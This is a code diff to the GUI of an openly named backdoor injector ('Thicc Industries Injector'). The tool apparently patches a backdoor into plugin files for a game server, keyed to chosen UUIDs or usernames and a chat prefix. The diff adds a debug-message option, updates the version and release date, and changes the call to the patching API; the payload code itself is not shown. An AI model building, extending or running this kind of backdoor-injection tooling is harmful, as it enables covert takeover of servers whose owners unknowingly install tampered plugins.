@@ -34,8 +34,8 @@ public class InjectorGUI{
                 JOptionPane.showMessageDialog(
                         null,
                         "Created by: Thicc Industries - Remasted By ThnksCJ,\n" +
-                                "Backdoor Version: 2.1\n" +
-                                "Release Date: January 29 2022\n" +
+                                "Backdoor Version: 2.2.4\n" +
+                                "Release Date: June 13 2022\n" +
                                 "License: GPL v3.0",
                         "Thicc Industries Injector",
                         JOptionPane.INFORMATION_MESSAGE
@@ -76,7 +76,7 @@ public class InjectorGUI{
         String UUIDList;
         String ChatPrefix;
         Boolean InjectOther;
-
+        Boolean Warnings;
         int usernames = JOptionPane.showConfirmDialog(null, "Use offline mode? (Usernames)", "Thicc Industries Injector", JOptionPane.YES_NO_OPTION);
         UUIDsAreUsernames = usernames == JOptionPane.YES_OPTION;
 
@@ -115,17 +115,23 @@ public class InjectorGUI{
                 JOptionPane.YES_NO_OPTION
         ) == JOptionPane.YES_OPTION;
 
+        Warnings = JOptionPane.showConfirmDialog(
+                null,
+                "Enable Debug Messages?\n[Please use this for github issues]",
+                "Thicc Industries Injector",
+                JOptionPane.YES_NO_OPTION
+        ) == JOptionPane.YES_OPTION;
         //Parse uuids
 
         String[] splitUUID = UUIDList.split(",");
 
-        API.SimpleConfig sc = new API.SimpleConfig(UUIDsAreUsernames, splitUUID, ChatPrefix, InjectOther);
-        boolean result2 = API.patchFile(InPath, OutPath, sc, true, false);
+        API.SimpleConfig sc = new API.SimpleConfig(UUIDsAreUsernames, splitUUID, ChatPrefix, InjectOther, Warnings);
+        boolean result2 = API.patchFile(InPath, OutPath, sc, true, true, true);
 
         if(result2){
             JOptionPane.showMessageDialog(null, "Backdoor injection complete.\nIf this project helped you, considering starring it on GitHub.", "Thicc Industries Injector", JOptionPane.INFORMATION_MESSAGE);
         }else{
-            JOptionPane.showMessageDialog(null, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.", "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
+            JOptionPane.showMessageDialog(null, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.\nPlease run the injector again with debug messages on before submitting issues.", "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
         }
     }
 
